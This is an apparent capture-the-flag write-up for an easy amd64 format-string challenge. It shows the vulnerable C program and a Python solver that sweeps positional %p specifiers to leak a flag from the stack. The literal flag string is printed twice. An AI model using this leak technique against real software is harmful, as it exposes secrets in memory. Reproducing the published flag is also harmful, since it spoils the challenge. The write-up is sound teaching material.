---
title: "Radio Vice City"
area: format-strings
role: author
event: friendly-2026
published: 2026-09-29
summary: "Same leak as Radio Los Santos, but deeper on the stack, so the exploit sweeps positional %p arguments instead of one offset."
techniques: ["format string", "positional specifiers", "stack information leak"]
difficulty: easy
arch: amd64
flag: "Securinets{v1c3_c1ty_5_d34d_ch4nn3ls_st1ll_4nsw3r}"
---

> Category: **pwn** — Tag: **format-string**
> Flag: `Securinets{v1c3_c1ty_5_d34d_ch4nn3ls_st1ll_4nsw3r}`

A slightly deeper variant of [Radio Los Santos](../radio_los_santos) — same
bug, but the flag is buried a few stack frames deeper, so we have to be more
precise about *which* format-string argument we ask for.

## 1. The program

```c
void getTopSecretAssest(){
    int f = open("flag", O_RDONLY);
    char flag[0x50];
    read(f, flag, sizeof(flag));
    close(f);
    return;
}

void vuln(){
    char buf[0x100];
    read(0, buf, sizeof(buf));
    printf(buf);          // <-- format string bug, same as Los Santos
    return;
}

// A chain of "dummy" functions, each with its own local stack buffer,
// that just calls the next one — this pushes vuln()'s stack frame
// (and printf's phantom arguments) several frames deeper than main().
void f5(){ char buf[67];  vuln(); }
void f4(){ char buf[50];  f5();  }
void f3(){ char buf[10];  f4();  }
void f2(){ char buf[0x200]; f3(); }
void f1(){ getTopSecretAssest(); f2(); }

void challenge(){ f1(); }
```

The important thing to notice: `getTopSecretAssest()` (which reads the flag
onto its own local stack buffer) is called from `f1()`, then `f2()`,
`f3()`, `f4()`, `f5()` each add *their own* local buffers on top before
`vuln()` finally runs `printf(buf)`. That's just the challenge author
padding the stack with extra frames so the flag isn't sitting at some
trivially guessable offset — it's still on the stack, just further "back."

## 2. The exploit: sweep with positional `%p`

Instead of guessing one offset, `solver.py` just leaks a *range* of stack
slots as hex pointers and eyeballs the result:

```python
payload = ""
for i in range(120, 130):
    payload += f"%{i}$p "

p.sendline(payload.encode())
# the flag is on the stack we need only get it and decode it

leaks = p.recv().decode().split()
leaks = [p64(int(e, 16)) for e in leaks if e != "(nil)"]
print(leaks)
```

Here's what each piece means for beginners:

- **`%N$p`** is a *positional* format specifier. Instead of "take the next
  argument in sequence" (like plain `%p`), `%N$p` says "take the *Nth*
  argument specifically" and print it as a pointer (hex). Positional
  specifiers let us probe arbitrary stack slots without needing to consume
  all the ones before them first.
- The loop asks for slots `120` through `129` — a range the author found
  by testing locally (with `DEBUG=1`, plain `process(b)`, no GDB needed for
  this one) and noticing the flag bytes land somewhere around there once
  the string is treated 8 bytes at a time.
- `%p` prints values in hex like `0x676174667b7374...`. Since the flag is
  ASCII text sitting in consecutive memory, reading 8 bytes at a time and
  converting each hex value back into raw bytes with `p64()` reconstructs
  chunks of the flag string (each `p64()` call turns a Python integer back
  into its little-endian 8-byte representation — exactly how it was laid
  out in memory).
- `"(nil)"` values (`NULL` pointers) are filtered out since they don't
  decode to anything useful.

After this, `leaks` is a list of 8-byte chunks; concatenating/printing them
(the script leaves this as an exercise via `p.interactive()` /
`print(leaks)`) reveals the flag text embedded in the stack.

## 3. Why this works without any GOT overwrite or shellcode

Unlike the other format-string challenges in this set, there's no need to
hijack control flow here at all — the flag is *already sitting in
readable memory* by the time `printf(buf)` runs. A **pure information leak**
via positional `%p` specifiers is enough. This is usually the very first
thing to try against any format string bug: can you just read out secrets
with `%p`/`%s`, before reaching for the heavier "overwrite GOT and pop a
shell" tools.

## 4. Running it

```bash
python3 solver.py
```
The script prints the list of leaked 8-byte values; the flag characters
appear among them once decoded.
